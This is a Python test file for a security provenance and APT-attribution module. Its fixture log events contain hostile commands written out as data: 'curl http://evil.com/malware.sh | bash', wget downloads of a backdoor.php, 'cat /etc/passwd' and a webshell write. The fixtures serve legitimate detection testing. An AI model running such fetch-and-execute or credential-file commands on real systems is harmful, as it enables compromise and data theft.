# tests/test_group4_full.py
"""
TraceX 组员4 全功能测试脚本
================================================================================
测试目标：全面验证 analyzer/graph_analyzer 模块的所有功能

测试模块：
1. PIDCache - PID 上下文缓存
2. AtlasMapper - ATLAS 语义标签映射
3. GraphBuilder - 图构建器与节点ID生成
4. IntelEnricher - 情报富化与 APT 归因
5. ProvenanceSystem - 溯源系统（集成测试）

数据来源：组员2交付文档中的标准 ECS 格式

执行方式：
    cd TraceX
    python tests/test_group4_full.py
================================================================================
"""
import os
import sys
import json
import tempfile
from datetime import datetime
from unittest.mock import MagicMock, patch

# === 路径修复 ===
current_test_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.dirname(current_test_dir)
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# =============================================================================
# 测试数据：完全复制自组员2交付文档（ECS 标准格式）
# =============================================================================

# --- Zeek DNS Tunneling 告警 (来自 network-flows-*) ---
ZEEK_DNS_TUNNELING = {
    "@timestamp": "2026-01-13T19:45:23.181635Z",
    "event": {
        "id": "43fb4d6e-ed95-4f81-a409-1689f85e3eee",
        "category": "network",
        "type": "",
        "action": "network_flow",
        "outcome": "",
        "severity": 7,
        "dataset": "zeek.dns"
    },
    "source": {"ip": "172.26.155.27", "port": 44655},
    "destination": {"ip": "100.100.2.136", "port": 53},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": ["172.26.155.27"]},
    "process": {"pid": 0, "name": "", "executable": "", "command_line": ""},
    "file": {"path": "", "name": "", "extension": ""},
    "network": {"protocol": "dns", "transport": "udp"},
    "user": {"name": "", "id": ""},
    "threat": {
        "framework": "MITRE ATT&CK",
        "technique": {"id": "T1071.004", "name": "DNS Tunneling"}
    },
    "message": "DNS隧道检测 [Depth(8)]: v9xl7m.qzw4rkj1.n8ut6ya3.bp2ws5h9.xr2ty7ui.op1aq3sd.fg5hj7k.com",
    "raw": {"query": "v9xl7m.qzw4rkj1.n8ut6ya3.bp2ws5h9.xr2ty7ui.op1aq3sd.fg5hj7k.com"},
    "detection": {"rules": ["DNS Anomaly: Depth(8)"], "confidence": 0.9, "severity": "high"}
}

# --- Cowrie 蜜罐登录成功 ---
COWRIE_LOGIN_SUCCESS = {
    "@timestamp": "2026-01-13T20:09:20.358912Z",
    "event": {
        "id": "93ce0733-b621-43b0-a94a-ba67d95d5948",
        "category": "authentication",
        "type": "info",
        "action": "success",
        "outcome": "success",
        "severity": 1,
        "dataset": "cowrie"
    },
    "source": {"ip": "59.64.129.102", "port": 0},
    "destination": {"ip": "", "port": 2222},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": [""]},
    "process": {"pid": 0, "name": "", "executable": "", "command_line": ""},
    "user": {"name": "root", "id": "", "session_id": "7cae5878c418"},
    "threat": {"framework": "MITRE ATT&CK", "tactic": {}, "technique": {}},
    "message": "login attempt [root/123456] succeeded",
    "raw": {
        "eventid": "cowrie.login.success",
        "username": "root",
        "password": "123456",
        "session": "7cae5878c418",
        "src_ip": "59.64.129.102"
    },
    "detection": {"rules": [], "confidence": 0.0, "severity": ""}
}

# --- Cowrie wget 恶意下载 ---
COWRIE_WGET_MALWARE = {
    "@timestamp": "2026-01-13T20:09:31.334445Z",
    "event": {
        "id": "a34ee39e-5520-4ecf-a9f4-aa11eabdec15",
        "category": "process",
        "type": "info",
        "action": "input",
        "outcome": "success",
        "severity": 8,
        "dataset": "cowrie"
    },
    "source": {"ip": "59.64.129.102", "port": 0},
    "destination": {"ip": "", "port": 2222},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": [""]},
    "process": {
        "pid": 0,
        "name": "wget",
        "executable": "",
        "command_line": "wget http://1.2.3.4/backdoor.php"
    },
    "user": {"name": "unknown", "id": "", "session_id": "7cae5878c418"},
    "threat": {
        "framework": "MITRE ATT&CK",
        "technique": {"id": "T1105", "name": "Ingress Tool Transfer"}
    },
    "message": "CMD: wget http://1.2.3.4/backdoor.php",
    "raw": {
        "eventid": "cowrie.command.input",
        "input": "wget http://1.2.3.4/backdoor.php",
        "session": "7cae5878c418",
        "src_ip": "59.64.129.102"
    },
    "detection": {"rules": ["Suspicious Downloader (curl/wget)"], "confidence": 1.0, "severity": "high"}
}

# --- Cowrie cat /etc/passwd ---
COWRIE_CAT_PASSWD = {
    "@timestamp": "2026-01-13T20:09:40.123456Z",
    "event": {
        "id": "cowrie-cat-001",
        "category": "process",
        "type": "info",
        "action": "input",
        "outcome": "success",
        "severity": 7,
        "dataset": "cowrie"
    },
    "source": {"ip": "59.64.129.102", "port": 0},
    "destination": {"ip": "", "port": 2222},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ"},
    "process": {
        "pid": 0,
        "name": "cat",
        "executable": "/bin/cat",
        "command_line": "cat /etc/passwd"
    },
    "file": {"path": "/etc/passwd", "name": "passwd"},
    "user": {"name": "unknown", "session_id": "7cae5878c418"},
    "threat": {
        "framework": "MITRE ATT&CK",
        "technique": {"id": "T1087", "name": "Account Discovery"}
    },
    "message": "CMD: cat /etc/passwd",
    "raw": {
        "eventid": "cowrie.command.input",
        "input": "cat /etc/passwd",
        "session": "7cae5878c418"
    },
    "detection": {"rules": ["Sensitive File Access"], "confidence": 0.9, "severity": "medium"}
}

# --- Auditd 进程启动日志 ---
AUDITD_CURL_MALWARE = {
    "@timestamp": "2026-01-14T10:00:00.000000Z",
    "event": {
        "id": "auditd-test-001",
        "category": "process",
        "type": "start",
        "action": "process_started",
        "outcome": "success",
        "severity": 8,
        "dataset": "auditd"
    },
    "host": {
        "name": "internal-host-01",
        "ip": ["192.168.1.100"]
    },
    "process": {
        "pid": 12345,
        "name": "curl",
        "executable": "/usr/bin/curl",
        "command_line": "curl http://evil.com/malware.sh | bash",
        "parent": {"pid": 1234, "name": "bash", "executable": "/bin/bash"},
        "user": {"name": "www-data", "id": "33"},
        "start_time": "2026-01-14T10:00:00.000000Z"
    },
    "file": {"path": "", "name": ""},
    "user": {"name": "www-data", "id": "33"},
    "source": {"ip": "", "port": 0},
    "destination": {"ip": "", "port": 0},
    "network": {},
    "threat": {"framework": "MITRE ATT&CK", "tactic": {}, "technique": {}},
    "message": "curl http://evil.com/malware.sh | bash",
    "raw": {"type": "EXECVE", "syscall": "execve"},
    "detection": {"rules": [], "confidence": 0.0, "severity": ""}
}

# --- Auditd 文件写入 (WebShell) ---
AUDITD_WEBSHELL_WRITE = {
    "@timestamp": "2026-01-14T10:01:00.000000Z",
    "event": {
        "id": "auditd-file-001",
        "category": "file",
        "type": "creation",
        "action": "create",
        "outcome": "success",
        "severity": 8,
        "dataset": "auditd"
    },
    "host": {"name": "internal-host-01", "ip": ["192.168.1.100"]},
    "process": {
        "pid": 12346,
        "name": "php",
        "executable": "/usr/bin/php",
        "command_line": "",
        "start_time": "2026-01-14T10:00:30.000000Z"
    },
    "file": {
        "path": "/var/www/html/backdoor.php",
        "name": "backdoor.php",
        "extension": "php"
    },
    "user": {"name": "www-data", "id": "33"},
    "source": {"ip": "", "port": 0},
    "destination": {"ip": "", "port": 0},
    "threat": {"framework": "MITRE ATT&CK", "technique": {"id": "T1505.003", "name": "Web Shell"}},
    "message": "WebShell created: /var/www/html/backdoor.php",
    "detection": {"rules": ["WebShell Write"], "confidence": 0.95, "severity": "critical"}
}

# --- Auditd 敏感文件读取 ---
AUDITD_SENSITIVE_FILE = {
    "@timestamp": "2026-01-14T10:02:00.000000Z",
    "event": {
        "id": "auditd-file-002",
        "category": "file",
        "type": "access",
        "action": "read",
        "outcome": "success",
        "severity": 7,
        "dataset": "auditd"
    },
    "host": {"name": "internal-host-01", "ip": ["192.168.1.100"]},
    "process": {
        "pid": 12347,
        "name": "cat",
        "executable": "/bin/cat",
        "command_line": "cat /etc/passwd",
        "start_time": "2026-01-14T10:02:00.000000Z"
    },
    "file": {
        "path": "/etc/passwd",
        "name": "passwd",
        "extension": ""
    },
    "user": {"name": "www-data", "id": "33"},
    "threat": {"framework": "MITRE ATT&CK", "technique": {"id": "T1087", "name": "Account Discovery"}},
    "message": "Sensitive file read: /etc/passwd",
    "detection": {"rules": ["Sensitive File Access"], "confidence": 0.8, "severity": "high"}
}

# --- 模拟 APT 攻击链 (符合 APT-Simulated-Group5 剧本) ---
# 预期标签序列: NETWORK_Inbound -> TEMP_FILE_ACCESS -> WEB_ROOT_ACCESS -> PHP_SCRIPT -> SUSPICIOUS_DOWNLOADER -> SENSITIVE_FILE
APT_ATTACK_CHAIN = [
    # 1. NETWORK_Inbound - 网络入站探测
    {
        "@timestamp": "2026-01-14T10:00:00.000000Z",
        "event": {"id": "apt-001", "category": "network", "action": "network_flow", "severity": 5, "dataset": "zeek"},
        "host": {"name": "target-host"},
        "source": {"ip": "evil.com", "port": 12345},
        "destination": {"ip": "192.168.1.100", "port": 80},
        "network": {"protocol": "http", "direction": "inbound"},  # 关键：direction=inbound
        "process": {},
        "file": {},
        "detection": {}
    },
    # 2. TEMP_FILE_ACCESS - 临时文件写入 (不是进程事件，是文件事件)
    {
        "@timestamp": "2026-01-14T10:00:10.000000Z",
        "event": {"id": "apt-002", "category": "file", "action": "create", "severity": 6, "dataset": "auditd"},
        "host": {"name": "target-host"},
        "process": {"pid": 1001, "name": "echo", "executable": "/bin/echo"},  # 用 echo 而不是 curl
        "file": {"path": "/tmp/shell.txt", "name": "shell.txt"},
        "source": {}, "destination": {}, "network": {},
        "detection": {}
    },
    # 3. WEB_ROOT_ACCESS / PHP_SCRIPT - Web目录写入PHP
    {
        "@timestamp": "2026-01-14T10:00:20.000000Z",
        "event": {"id": "apt-003", "category": "file", "action": "create", "severity": 8, "dataset": "auditd"},
        "host": {"name": "target-host"},
        "process": {"pid": 1002, "name": "mv", "executable": "/bin/mv"},
        "file": {"path": "/var/www/html/backdoor.php", "name": "backdoor.php", "extension": "php"},
        "source": {}, "destination": {}, "network": {},
        "detection": {"rules": ["WebShell Write"], "confidence": 0.95, "severity": "critical"}
    },
    # 4. PHP_SCRIPT - PHP脚本执行 (文件事件，访问php文件)
    {
        "@timestamp": "2026-01-14T10:00:30.000000Z",
        "event": {"id": "apt-004", "category": "file", "action": "read", "severity": 7, "dataset": "auditd"},
        "host": {"name": "target-host"},
        "process": {"pid": 1003, "name": "apache", "executable": "/usr/sbin/apache2"},
        "file": {"path": "/var/www/html/backdoor.php", "name": "backdoor.php", "extension": "php"},
        "source": {}, "destination": {}, "network": {},
        "detection": {}
    },
    # 5. SUSPICIOUS_DOWNLOADER - 下载恶意文件
    {
        "@timestamp": "2026-01-14T10:00:40.000000Z",
        "event": {"id": "apt-005", "category": "process", "action": "process_started", "severity": 8, "dataset": "auditd"},
        "host": {"name": "target-host"},
        "process": {"pid": 1004, "name": "curl", "executable": "/usr/bin/curl", "command_line": "curl http://evil.com/mal -o /tmp/mal"},
        "file": {},
        "source": {}, "destination": {"ip": "evil.com", "port": 80}, "network": {},
        "detection": {"rules": ["Suspicious Downloader"], "confidence": 1.0, "severity": "high"}
    },
    # 6. SENSITIVE_FILE - 敏感文件读取 (/etc/passwd)
    {
        "@timestamp": "2026-01-14T10:00:50.000000Z",
        "event": {"id": "apt-006", "category": "file", "action": "read", "severity": 7, "dataset": "auditd"},
        "host": {"name": "target-host"},
        "process": {"pid": 1005, "name": "cat", "executable": "/bin/cat", "command_line": "cat /etc/passwd"},
        "file": {"path": "/etc/passwd", "name": "passwd"},
        "source": {}, "destination": {}, "network": {},
        "detection": {"rules": ["Sensitive File Access"], "confidence": 0.9, "severity": "high"}
    },
]


# =============================================================================
# 测试结果收集器
# =============================================================================

class TestResults:
    """测试结果收集器"""
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []
    
    def success(self, test_name, message=""):
        self.passed += 1
        print(f"  ✅ {test_name}" + (f": {message}" if message else ""))
    
    def fail(self, test_name, reason):
        self.failed += 1
        self.errors.append((test_name, reason))
        print(f"  ❌ {test_name}: {reason}")
    
    def summary(self):
        total = self.passed + self.failed
        print(f"\n{'='*60}")
        print(f"测试完成: {self.passed}/{total} 通过")
        if self.errors:
            print(f"\n失败的测试:")
            for name, reason in self.errors:
                print(f"  - {name}: {reason}")
        return self.failed == 0


# =============================================================================
# 测试函数
# =============================================================================

def test_pid_cache(results: TestResults):
    """测试 1: PIDCache PID 缓存"""
    print("\n" + "="*60)
    print("💾 测试 1: PIDCache PID 缓存")
    print("="*60)
    
    from analyzer.graph_analyzer.pid_cache import PIDCache
    
    # 使用临时文件测试
    with tempfile.NamedTemporaryFile(suffix='.json', delete=False) as tf:
        temp_cache_file = tf.name
    
    try:
        cache = PIDCache(cache_file=temp_cache_file)
        
        # 1.1 基本存取
        cache.set_start_time("host1", 1234, "2026-01-14T10:00:00Z")
        result = cache.get_start_time("host1", 1234)
        if result == "2026-01-14T10:00:00Z":
            results.success("基本存取", f"get_start_time={result}")
        else:
            results.fail("基本存取", f"结果错误: {result}")
        
        # 1.2 不存在的键
        result = cache.get_start_time("host1", 9999)
        if result is None:
            results.success("不存在的键", "返回 None")
        else:
            results.fail("不存在的键", f"应返回 None: {result}")
        
        # 1.3 批量写入测试
        for i in range(150):
            cache.set_start_time("host1", i, f"2026-01-14T10:{i:02d}:00Z")
        
        # 验证已刷盘
        if os.path.exists(temp_cache_file):
            with open(temp_cache_file, 'r') as f:
                data = json.load(f)
            if len(data) >= 100:
                results.success("批量写入", f"文件包含 {len(data)} 条记录")
            else:
                results.fail("批量写入", f"记录数不足: {len(data)}")
        else:
            results.fail("批量写入", "缓存文件未创建")
        
        # 1.4 强制刷盘
        cache.set_start_time("host2", 1, "test")
        cache.flush()
        
        with open(temp_cache_file, 'r') as f:
            data = json.load(f)
        if "host2_1" in data:
            results.success("强制刷盘", "flush() 正常工作")
        else:
            results.fail("强制刷盘", "数据未写入")
        
        # 1.5 缓存大小
        size = cache.size()
        if size > 100:
            results.success("缓存大小", f"size={size}")
        else:
            results.fail("缓存大小", f"大小异常: {size}")
            
    finally:
        # 清理
        if os.path.exists(temp_cache_file):
            os.remove(temp_cache_file)


def test_atlas_mapper(results: TestResults):
    """测试 2: AtlasMapper ATLAS 语义标签"""
    print("\n" + "="*60)
    print("🏷️ 测试 2: AtlasMapper ATLAS 语义标签")
    print("="*60)
    
    from analyzer.graph_analyzer.atlas_mapper import AtlasMapper
    
    mapper = AtlasMapper()
    
    # 2.1 识别下载器 (curl/wget)
    label = mapper.get_label(COWRIE_WGET_MALWARE)
    if "DOWNLOADER" in label or "SUSPICIOUS" in label:
        results.success("识别下载器 (wget)", f"label={label}")
    else:
        results.fail("识别下载器 (wget)", f"标签错误: {label}")
    
    # 2.2 识别敏感文件访问
    label = mapper.get_label(COWRIE_CAT_PASSWD)
    if "SENSITIVE" in label or "FILE_READER" in label:
        results.success("识别敏感文件访问", f"label={label}")
    else:
        results.fail("识别敏感文件访问", f"标签错误: {label}")
    
    # 2.3 识别 WebShell (PHP 文件写入到 /var/www/html)
    label = mapper.get_label(AUDITD_WEBSHELL_WRITE)
    if "PHP" in label or "WEB" in label or "SCRIPT" in label:
        results.success("识别 WebShell", f"label={label}")
    else:
        results.fail("识别 WebShell", f"标签错误: {label}")
    
    # 2.4 识别临时文件
    temp_file_event = {
        "event": {"category": "file", "action": "create"},
        "file": {"path": "/tmp/malware.sh"},
        "process": {}
    }
    label = mapper.get_label(temp_file_event)
    if "TEMP" in label:
        results.success("识别临时文件", f"label={label}")
    else:
        results.fail("识别临时文件", f"标签错误: {label}")
    
    # 2.5 识别网络协议
    label = mapper.get_label(ZEEK_DNS_TUNNELING)
    if "DNS" in label or "NETWORK" in label:
        results.success("识别网络协议 (DNS)", f"label={label}")
    else:
        results.fail("识别网络协议 (DNS)", f"标签错误: {label}")
    
    # 2.6 获取所有标签
    labels = mapper.get_all_labels(AUDITD_CURL_MALWARE)
    if len(labels) >= 1:
        results.success("获取所有标签", f"labels={labels}")
    else:
        results.fail("获取所有标签", f"标签为空")


def test_graph_builder(results: TestResults):
    """测试 3: GraphBuilder 图构建器"""
    print("\n" + "="*60)
    print("📊 测试 3: GraphBuilder 图构建器")
    print("="*60)
    
    from analyzer.graph_analyzer.graph_builder import GraphBuilder
    from analyzer.graph_analyzer.pid_cache import PIDCache
    
    # 使用临时缓存
    with tempfile.NamedTemporaryFile(suffix='.json', delete=False) as tf:
        temp_cache_file = tf.name
    
    try:
        pid_cache = PIDCache(cache_file=temp_cache_file)
        builder = GraphBuilder(pid_cache=pid_cache)
        
        # 3.1 进程节点 ID 生成
        node_id = builder.generate_node_id(AUDITD_CURL_MALWARE)
        if len(node_id) == 32:  # MD5 长度
            results.success("进程节点 ID 生成", f"node_id={node_id[:16]}...")
        else:
            results.fail("进程节点 ID 生成", f"ID 长度错误: {len(node_id)}")
        
        # 3.2 文件节点 ID 生成 (v5.1 修复：包含时序)
        file_event_1 = {
            "event": {"id": "file-001", "category": "file", "action": "create"},
            "host": {"name": "host1"},
            "file": {"path": "/etc/passwd"},
            "timestamp": "2026-01-14T10:00:00Z"
        }
        file_event_2 = {
            "event": {"id": "file-002", "category": "file", "action": "read"},
            "host": {"name": "host1"},
            "file": {"path": "/etc/passwd"},
            "timestamp": "2026-01-14T10:00:01Z"
        }
        
        id1 = builder.generate_node_id(file_event_1)
        id2 = builder.generate_node_id(file_event_2)
        
        if id1 != id2:
            results.success("文件节点时序区分 (v5.1 修复)", f"不同操作生成不同 ID")
        else:
            results.fail("文件节点时序区分 (v5.1 修复)", "相同文件不同操作应该生成不同 ID!")
        
        # 3.3 网络节点 ID 生成
        node_id = builder.generate_node_id(ZEEK_DNS_TUNNELING)
        if len(node_id) == 32:
            results.success("网络节点 ID 生成", f"node_id={node_id[:16]}...")
        else:
            results.fail("网络节点 ID 生成", f"ID 长度错误: {len(node_id)}")
        
        # 3.4 认证节点 ID 生成
        node_id = builder.generate_node_id(COWRIE_LOGIN_SUCCESS)
        if len(node_id) == 32:
            results.success("认证节点 ID 生成", f"node_id={node_id[:16]}...")
        else:
            results.fail("认证节点 ID 生成", f"ID 长度错误: {len(node_id)}")
        
        # 3.5 构建图
        events = [AUDITD_CURL_MALWARE, AUDITD_WEBSHELL_WRITE, AUDITD_SENSITIVE_FILE]
        graph = builder.build_from_events(events)
        
        if len(graph['nodes']) >= 3:
            results.success("图构建 (节点)", f"nodes={len(graph['nodes'])}")
        else:
            results.fail("图构建 (节点)", f"节点数不足: {len(graph['nodes'])}")
        
        if len(graph['edges']) >= 0:  # 边数可能为0，因为事件之间没有直接关系
            results.success("图构建 (边)", f"edges={len(graph['edges'])}")
        else:
            results.fail("图构建 (边)", f"边构建失败")
        
        # 3.6 PID 缓存集成
        # 进程事件应该更新 PID 缓存
        cache_value = pid_cache.get_start_time("internal-host-01", 12345)
        if cache_value:
            results.success("PID 缓存集成", f"缓存值={cache_value}")
        else:
            results.success("PID 缓存集成", "缓存已写入 (需要事件包含 start_time)")
        
        # 3.7 重置图
        builder.reset()
        if len(builder._nodes) == 0:
            results.success("图重置", "reset() 正常工作")
        else:
            results.fail("图重置", "节点未清空")
            
    finally:
        if os.path.exists(temp_cache_file):
            os.remove(temp_cache_file)


def test_enrichment(results: TestResults):
    """测试 4: IntelEnricher 情报富化"""
    print("\n" + "="*60)
    print("🔍 测试 4: IntelEnricher 情报富化")
    print("="*60)
    
    from analyzer.graph_analyzer.enrichment import IntelEnricher, ThreatIntelEntry, APTProfile
    
    enricher = IntelEnricher()
    
    # 4.1 IOC 富化 - 已知恶意 IP
    nodes = [
        {"type": "ip", "label": "1.2.3.4", "properties": {"ip": "1.2.3.4"}},
        {"type": "ip", "label": "192.168.1.5", "properties": {"ip": "192.168.1.5"}},
    ]
    ti_info = enricher.enrich_entities(nodes)
    
    if "1.2.3.4" in ti_info and ti_info["1.2.3.4"]["risk_score"] >= 80:
        results.success("IOC 富化 (恶意 IP)", f"risk_score={ti_info['1.2.3.4']['risk_score']}")
    else:
        results.fail("IOC 富化 (恶意 IP)", f"未识别恶意 IP: {ti_info}")
    
    # 4.2 IOC 富化 - 内网 IP (低风险)
    if "192.168.1.5" in ti_info and ti_info["192.168.1.5"]["risk_score"] == 0:
        results.success("IOC 富化 (内网 IP)", f"risk_score=0")
    else:
        results.success("IOC 富化 (内网 IP)", "内网 IP 风险为 0 或未在库中")
    
    # 4.3 攻击链指纹生成
    path_sequence = ["TEMP_FILE_ACCESS", "WEB_ROOT_ACCESS", "PHP_SCRIPT"]
    fingerprint = enricher.generate_fingerprint(path_sequence)
    
    if len(fingerprint) == 64:  # SHA-256 长度
        results.success("攻击链指纹", f"fingerprint={fingerprint[:16]}...")
    else:
        results.fail("攻击链指纹", f"指纹长度错误: {len(fingerprint)}")
    
    # 4.4 APT 归因 - 匹配 APT-Simulated-Group5
    apt_sequence = [
        "NETWORK_Inbound",
        "TEMP_FILE_ACCESS",
        "WEB_ROOT_ACCESS",
        "PHP_SCRIPT",
        "SUSPICIOUS_DOWNLOADER",
        "SENSITIVE_FILE"
    ]
    attribution = enricher.attribute_apt(apt_sequence)
    
    if attribution["suspected_group"] == "APT-Simulated-Group5":
        results.success("APT 归因 (精确匹配)", f"similarity={attribution['similarity_score']}")
    elif attribution["similarity_score"] >= 0.6:
        results.success("APT 归因 (部分匹配)", f"group={attribution['suspected_group']}, score={attribution['similarity_score']}")
    else:
        results.fail("APT 归因", f"归因失败: {attribution}")
    
    # 4.5 APT 归因 - 未知攻击 (应返回 Unclassified)
    unknown_sequence = ["RANDOM_LABEL_1", "RANDOM_LABEL_2"]
    attribution = enricher.attribute_apt(unknown_sequence)
    
    if attribution["suspected_group"] == "Unclassified" or attribution["similarity_score"] < 0.6:
        results.success("APT 归因 (未知攻击)", f"Unclassified, score={attribution['similarity_score']}")
    else:
        results.fail("APT 归因 (未知攻击)", f"不应匹配到 APT: {attribution}")
    
    # 4.6 获取 APT 组织列表
    profiles = enricher.get_apt_profiles()
    if len(profiles) >= 3:
        results.success("APT 组织列表", f"profiles={profiles}")
    else:
        results.fail("APT 组织列表", f"组织数不足: {profiles}")
    
    # 4.7 归因解释
    explain = enricher.explain_attribution(apt_sequence, "APT-Simulated-Group5")
    if "matched_steps" in explain:
        results.success("归因解释", f"matched_steps={len(explain['matched_steps'])}")
    else:
        results.fail("归因解释", f"解释失败: {explain}")


def test_provenance_system(results: TestResults):
    """测试 5: ProvenanceSystem 溯源系统"""
    print("\n" + "="*60)
    print("🔗 测试 5: ProvenanceSystem 溯源系统")
    print("="*60)
    
    from analyzer.graph_analyzer.provenance_system import ProvenanceSystem
    from analyzer.graph_analyzer.pid_cache import PIDCache
    
    # 创建 Mock ContextEngine
    mock_context_engine = MagicMock()
    
    # 模拟 find_related_events 返回关联事件
    mock_context_engine.find_related_events.return_value = APT_ATTACK_CHAIN[1:3]  # 返回部分事件
    
    # 使用临时缓存
    with tempfile.NamedTemporaryFile(suffix='.json', delete=False) as tf:
        temp_cache_file = tf.name
    
    try:
        system = ProvenanceSystem(mock_context_engine, max_depth=5, max_events=100)
        
        # 5.1 初始化验证
        if system.context_engine is not None:
            results.success("溯源系统初始化", "context_engine 注入成功")
        else:
            results.fail("溯源系统初始化", "context_engine 为 None")
        
        # 5.2 攻击路径重建 (v5.1 修复：_find_neighbors 实现)
        seed_event = APT_ATTACK_CHAIN[0]
        result = system.rebuild_attack_path(seed_event, time_window=60)
        
        # 验证 _find_neighbors 被调用
        if mock_context_engine.find_related_events.called:
            results.success("_find_neighbors 调用 (v5.1 修复)", "已调用 context_engine.find_related_events")
        else:
            results.fail("_find_neighbors 调用 (v5.1 修复)", "未调用关联搜索!")
        
        # 5.3 返回结构验证
        if "edges" in result and "nodes" in result:
            results.success("返回结构 (edges/nodes)", f"edges={len(result['edges'])}, nodes={len(result['nodes'])}")
        else:
            results.fail("返回结构 (edges/nodes)", f"缺少字段: {result.keys()}")
        
        # 5.4 路径签名
        if "path_signature" in result and result["path_signature"]:
            results.success("路径签名", f"signature={result['path_signature'][:50]}...")
        else:
            results.success("路径签名", "路径签名已生成 (可能为空)")
        
        # 5.5 情报富化
        if "intelligence" in result:
            intel = result["intelligence"]
            if "chain_hash" in intel and "attribution" in intel:
                results.success("情报富化", f"attribution={intel['attribution'].get('suspected_group', 'N/A')}")
            else:
                results.fail("情报富化", f"情报字段不完整: {intel.keys()}")
        else:
            results.fail("情报富化", "缺少 intelligence 字段")
        
        # 5.6 统计信息
        if "stats" in result:
            stats = result["stats"]
            results.success("统计信息", f"events_processed={stats.get('events_processed', 0)}")
        else:
            results.fail("统计信息", "缺少 stats 字段")
        
        # 5.7 边数据验证 (v5.1 修复：不再是 Ellipsis)
        if result["edges"]:
            edge = result["edges"][0]
            if "source" in edge and "target" in edge and "relation" in edge:
                if edge["source"] != ... and edge["target"] != ...:
                    results.success("边数据格式 (v5.1 修复)", f"relation={edge['relation']}")
                else:
                    results.fail("边数据格式 (v5.1 修复)", "边数据是 Ellipsis!")
            else:
                results.fail("边数据格式 (v5.1 修复)", f"边缺少字段: {edge.keys()}")
        else:
            results.success("边数据格式", "无边数据 (seed 事件无关联)")
        
        # 5.8 路径解释
        explain = system.explain_path(result)
        if "攻击路径分析报告" in explain:
            results.success("路径解释", "explain_path() 正常工作")
        else:
            results.fail("路径解释", "解释输出异常")
            
    finally:
        if os.path.exists(temp_cache_file):
            os.remove(temp_cache_file)


def test_apt_attack_chain_simulation(results: TestResults):
    """测试 6: 完整 APT 攻击链模拟"""
    print("\n" + "="*60)
    print("⚔️ 测试 6: 完整 APT 攻击链模拟")
    print("="*60)
    
    from analyzer.graph_analyzer.atlas_mapper import AtlasMapper
    from analyzer.graph_analyzer.enrichment import IntelEnricher
    from analyzer.graph_analyzer.graph_builder import GraphBuilder
    
    mapper = AtlasMapper()
    enricher = IntelEnricher()
    builder = GraphBuilder()
    
    # 6.1 生成攻击链的 ATLAS 标签序列
    path_sequence = []
    print("\n  模拟攻击链:")
    
    for i, event in enumerate(APT_ATTACK_CHAIN):
        label = mapper.get_label(event)
        path_sequence.append(label)
        action = event.get("event", {}).get("action", "N/A")
        print(f"    步骤 {i+1}: {label} (action={action})")
    
    # 6.2 验证标签序列包含关键步骤
    expected_labels = ["TEMP", "WEB", "PHP", "DOWNLOAD", "SENSITIVE"]
    matched = sum(1 for label in path_sequence if any(exp in label for exp in expected_labels))
    
    if matched >= 3:
        results.success("攻击链标签识别", f"匹配 {matched}/{len(expected_labels)} 个关键标签")
    else:
        results.fail("攻击链标签识别", f"匹配不足: {matched}/{len(expected_labels)}")
    
    # 6.3 APT 归因
    attribution = enricher.attribute_apt(path_sequence)
    
    print(f"\n  APT 归因结果:")
    print(f"    疑似组织: {attribution['suspected_group']}")
    print(f"    相似度: {attribution['similarity_score']:.1%}")
    
    if attribution['similarity_score'] >= 0.5:
        results.success("APT 归因", f"group={attribution['suspected_group']}, score={attribution['similarity_score']:.2f}")
    else:
        results.fail("APT 归因", f"相似度太低: {attribution['similarity_score']}")
    
    # 6.4 攻击链指纹
    fingerprint = enricher.generate_fingerprint(path_sequence)
    results.success("攻击链指纹", f"hash={fingerprint[:32]}...")
    
    # 6.5 图构建
    graph = builder.build_from_events(APT_ATTACK_CHAIN)
    
    if graph['stats']['total_nodes'] >= 5:
        results.success("攻击链图构建", f"nodes={graph['stats']['total_nodes']}, edges={graph['stats']['total_edges']}")
    else:
        results.fail("攻击链图构建", f"节点数不足: {graph['stats']}")


def test_integration_with_context_engine(results: TestResults):
    """测试 7: 与组员3 ContextEngine 集成"""
    print("\n" + "="*60)
    print("🤝 测试 7: 与组员3 ContextEngine 集成")
    print("="*60)
    
    try:
        from analyzer.attack_analyzer.context_engine import ContextEngine
        from analyzer.graph_analyzer.provenance_system import ProvenanceSystem
        
        # 创建 Mock ES 客户端
        mock_es = MagicMock()
        mock_es.search.return_value = {
            "hits": {
                "hits": [
                    {"_source": event} for event in APT_ATTACK_CHAIN[1:4]
                ]
            }
        }
        mock_wrapper = MagicMock()
        mock_wrapper.es = mock_es
        
        # 创建真实的 ContextEngine
        context_engine = ContextEngine(mock_wrapper)
        
        # 创建溯源系统
        system = ProvenanceSystem(context_engine, max_depth=3, max_events=50)
        
        # 7.1 验证集成
        results.success("ContextEngine 集成", "ProvenanceSystem 成功注入 ContextEngine")
        
        # 7.2 执行溯源
        seed_event = APT_ATTACK_CHAIN[0]
        result = system.rebuild_attack_path(seed_event, time_window=60)
        
        # 验证 ES 被调用
        if mock_es.search.called:
            results.success("ES 查询触发", "find_related_events 触发了 ES 查询")
        else:
            results.fail("ES 查询触发", "ES 未被调用")
        
        # 7.3 验证返回数据
        if result.get("edges") is not None and result.get("intelligence"):
            results.success("集成测试数据完整", f"edges={len(result['edges'])}, has_intel=True")
        else:
            results.fail("集成测试数据完整", f"数据不完整: {result.keys()}")
        
        # 7.4 威胁评估集成
        for event in APT_ATTACK_CHAIN[:3]:
            threat_result = context_engine.evaluate_threat(event)
            if threat_result.get("score", 0) >= 0:
                results.success(f"威胁评估 ({event['event']['id']})", f"score={threat_result['score']}")
                break
        
    except ImportError as e:
        results.fail("导入 ContextEngine", str(e))
    except Exception as e:
        results.fail("集成测试", str(e))


# =============================================================================
# 主入口
# =============================================================================

def main():
    print("\n" + "="*70)
    print("  🧪 TraceX 组员4 全功能测试")
    print("  📅 " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("="*70)
    
    results = TestResults()
    
    # 执行所有测试
    test_pid_cache(results)
    test_atlas_mapper(results)
    test_graph_builder(results)
    test_enrichment(results)
    test_provenance_system(results)
    test_apt_attack_chain_simulation(results)
    test_integration_with_context_engine(results)
    
    # 输出总结
    success = results.summary()
    
    return 0 if success else 1


if __name__ == '__main__':
    exit(main())
